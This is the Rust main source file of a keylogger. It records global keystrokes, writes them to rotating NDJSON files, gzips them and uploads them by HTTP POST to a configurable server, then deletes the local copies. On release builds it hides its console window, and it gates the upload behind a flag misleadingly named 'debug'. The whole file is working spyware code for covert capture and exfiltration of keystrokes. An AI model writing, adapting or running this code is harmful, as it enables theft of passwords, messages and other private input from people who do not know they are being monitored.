#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use crate::keylog::{KeyLoggerHandle, KeylogEntry, spawn_keylogger};
use anyhow::{Context, Result};
use clap::Parser;
use flate2::{Compression, write::GzEncoder};
use rdev::listen;
use reqwest::Client;
use std::{
    path::{Path, PathBuf},
    time::Duration,
};
use tokio::{
    fs::{self, File, OpenOptions},
    io::{AsyncWriteExt, BufWriter},
    select,
    sync::mpsc,
};

mod keylog;

#[derive(Parser, Debug, Clone)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Upload endpoint URL
    #[arg(long, default_value = "http://127.0.0.1:8080/api/upload")]
    url: String,

    /// Output file base path
    #[arg(short, long, default_value = "keylog.ndjson")]
    output: PathBuf,

    /// Upload interval in seconds
    #[arg(long, default_value_t = 60)]
    upload_interval: u64,

    /// Aggregation interval in milliseconds (how often to write to disk)
    #[arg(short, long, default_value_t = 60_000)]
    logger_interval: u64,

    /// Enable upload functionality
    #[arg(short, long, default_value_t = false)]
    debug: bool,
}

async fn open_log_file(path: &Path) -> Result<File> {
    OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .await
        .context("Failed to open log file")
}

async fn rotate_log_file(current_path: &Path) -> Result<Option<PathBuf>> {
    if !current_path.exists() {
        return Ok(None);
    }

    let metadata = fs::metadata(current_path).await?;
    if metadata.len() == 0 {
        return Ok(None);
    }

    let timestamp = chrono::Utc::now().format("%Y%m%d%H%M%S");
    let file_stem = current_path
        .file_stem()
        .unwrap_or_default()
        .to_string_lossy();
    let extension = current_path
        .extension()
        .unwrap_or_default()
        .to_string_lossy();

    let pending_path =
        current_path.with_file_name(format!("{}.{}.pending.{}", file_stem, timestamp, extension));

    fs::rename(current_path, &pending_path)
        .await
        .context("Failed to rotate log file")?;

    Ok(Some(pending_path))
}

async fn gzip_and_upload(url: String, file_path: PathBuf) -> Result<()> {
    let content = fs::read(&file_path).await?;

    let compressed = {
        let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
        std::io::Write::write_all(&mut encoder, &content)?;
        encoder.finish()?
    };

    let client = Client::new();
    let part = reqwest::multipart::Part::bytes(compressed)
        .file_name("keylog.ndjson.gz")
        .mime_str("application/gzip")?;

    let form = reqwest::multipart::Form::new().part("file", part);

    let response = client
        .post(&url)
        .multipart(form)
        .send()
        .await
        .context("Failed to send request")?;

    if !response.status().is_success() {
        anyhow::bail!("Upload failed with status: {}", response.status());
    }

    fs::remove_file(&file_path)
        .await
        .context("Failed to delete uploaded file")?;
    println!("Upload successful. Deleted local artifact.");

    Ok(())
}

async fn run_persistence_loop(args: Args, mut rx: mpsc::Receiver<KeylogEntry>) -> Result<()> {
    let mut first_write = true;
    let mut writer = BufWriter::new(open_log_file(&args.output).await?);
    let mut upload_interval = tokio::time::interval(Duration::from_secs(args.upload_interval));
    loop {
        select! {
            maybe_entry = rx.recv() => {
                match maybe_entry {
                    Some(entry) => {
                        if !entry.keys.is_empty() || first_write {
                            let json = serde_json::to_string(&entry)?;
                            writer.write_all(json.as_bytes()).await?;
                            writer.write_all(b"\n").await?;
                            writer.flush().await?;
                            first_write = false;
                        }
                    }
                    None => {
                        println!("Keylogger channel closed.");
                        break;
                    }
                }
            }

            _ = upload_interval.tick(), if args.debug => {
                if let Err(e) = writer.flush().await {
                    eprintln!("Error flushing buffer before rotation: {}", e);
                }

                drop(writer);

                match rotate_log_file(&args.output).await {
                    Ok(Some(pending_path)) => {
                        let url = args.url.clone();
                        tokio::spawn(async move {
                            if let Err(e) = gzip_and_upload(url, pending_path).await {
                                eprintln!("Upload task failed: {:?}", e);
                            }
                        });
                    }
                    Ok(None) => { /* Nothing to upload */ }
                    Err(e) => eprintln!("Failed to rotate logs: {:?}", e),
                }

                writer = BufWriter::new(open_log_file(&args.output).await?);
            }
        }
    }

    Ok(())
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();
    println!("Starting Keylogger...");
    println!(
        "Aggregation: {}ms | Upload: {}s",
        args.logger_interval, args.upload_interval
    );

    let KeyLoggerHandle {
        event_tx,
        report_rx,
        thread_handle,
    } = spawn_keylogger(Duration::from_millis(args.logger_interval));

    let manager_args = args.clone();
    let manager_handle = tokio::spawn(async move {
        if let Err(e) = run_persistence_loop(manager_args, report_rx).await {
            eprintln!("Persistence loop crashed: {:?}", e);
        }
    });

    let tx = event_tx.clone();
    if let Err(error) = listen(move |event| {
        let _ = tx.send(event);
    }) {
        eprintln!("Input listener error: {:?}", error);
    }

    println!("Input listener stopped. Shutting down...");
    drop(event_tx);

    if let Err(e) = thread_handle.join() {
        eprintln!("Aggregator thread finished with panic: {:?}", e);
    }

    let _ = manager_handle.await;
    Ok(())
}
